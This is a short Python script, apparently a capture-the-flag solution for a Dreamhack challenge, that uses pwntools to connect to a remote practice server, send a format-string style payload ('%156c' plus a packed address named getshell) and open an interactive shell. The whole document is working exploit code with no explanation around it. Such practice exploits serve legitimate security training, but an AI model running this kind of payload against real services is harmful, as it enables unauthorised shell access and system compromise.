from pwn import *

r=remote("host1.dreamhack.games",15955)
print("remote success")

getshell=0x08048669
payload="%156c"+p32(getshell)

r.sendline(payload)
r.interactive()
